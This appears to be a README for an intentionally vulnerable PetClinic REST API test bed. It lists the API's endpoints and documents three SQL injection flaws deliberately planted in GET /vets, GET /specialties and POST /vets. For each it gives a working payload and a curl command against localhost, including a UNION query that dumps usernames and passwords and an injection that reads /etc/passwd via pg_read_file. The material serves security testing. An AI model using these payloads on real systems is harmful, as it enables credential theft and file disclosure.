# Endpoints vulnerable for SQLi

This project has the following endpoints:
```shell
GET: /oops
POST: /owners
GET: /owners
GET: /owners/{ownerId}
PUT: /owners/{ownerId}
DELETE: /owners/{ownerId}
POST: /owners/{ownerId}/pets
GET: /owners/{ownerId}/pets/{petId}
PUT: /owners/{ownerId}/pets/{petId}
POST: /owners/{ownerId}/pets/{petId}/visits
GET: /pettypes
POST: /pettypes
GET: /pettypes/{petTypeId}
PUT: /pettypes/{petTypeId}
DELETE: /pettypes/{petTypeId}
GET: /pets
POST: /pets
GET: /pets/{petId}
PUT: /pets/{petId}
DELETE: /pets/{petId}
GET: /visits
POST: /visits
GET: /visits/{visitId}
PUT: /visits/{visitId}
DELETE: /visits/{visitId}
GET: /specialties
POST: /specialties
GET: /specialties/{specialtyId}
PUT: /specialties/{specialtyId}
DELETE: /specialties/{specialtyId}
GET: /vets
POST: /vets
GET: /vets/{vetId}
PUT: /vets/{vetId}
DELETE: /vets/{vetId}
POST: /users
```

Out of these, some are made vulnerable to SQL injection:
```HTTP
# other table data (UNION), single row
GET: /vets/{vetId}
# subvert logic, single row
GET: /specialties/{specialtyId} 
# (hidden) inserting data, single row
POST: /vets
```

## Endpoints with shallow depth
These vulnerable endpoints don't have deep code execution and all detect
multiple rows as SQLi, so payloads work internally, but don't always
return data in the HTTP response.

### Vulnerability 1: `GET /vets/{vetId}`
This vulnerability allows for UNION attacks, allowing an attacker to retrieve
data from other tables.

payload: `0' UNION SELECT NULL,username,password FROM users--`

```shell
curl -i -s -k -X $'GET' \
  -H $'Host: localhost:9966' \
  $'http://localhost:9966/petclinic/api/vets/0\'%20UNION%20SELECT%20NULL,username,password%20FROM%20users--'
```

### Vulnerability 2: `GET /specialties/{specialtyId}`
This vulnerability allows for subverting logic, allowing an attacker to retrieve
hidden data. 

payload: `4'--`

```shell
curl -i -s -k -X $'GET' \
  -H $'Host: localhost:9966'
  $'http://localhost:9966/petclinic/api/specialties/4\'--'
```
 
### Vulnerability 3: `POST /vets`
This vulnerability allows for inserting data, allowing an attacker to create
a new user with, e.g., leaked data. 

payload: `hack', (SELECT LEFT(pg_read_file('/etc/passwd'), 30)) ) RETURNING id--`
```json
{
  "firstName": "hack', (SELECT LEFT(pg_read_file('/etc/passwd'), 30)) ) RETURNING id--",
  "lastName": "",
  "specialties": [
    {
      "name": "hacker"
    }
  ]
}
```

```shell
curl -i -s -k -X $'POST' \
    -H $'Content-Type: application/json' -H $'Accept: application/json'-H $'Host: localhost:9966' -H $'Content-Length: 168' \
    --data-binary $'{\x0a  \"firstName\": \"hack\', (SELECT LEFT(pg_read_file(\'/etc/passwd\'), 30)) ) RETURNING id--\",\x0a  \"lastName\": \"\",\x0a  \"specialties\": [\x0a    {\x0a      \"name\": \"hacker\"\x0a    }\x0a  ]\x0a}' \
    $'http://localhost:9966/petclinic/api/vets'
```
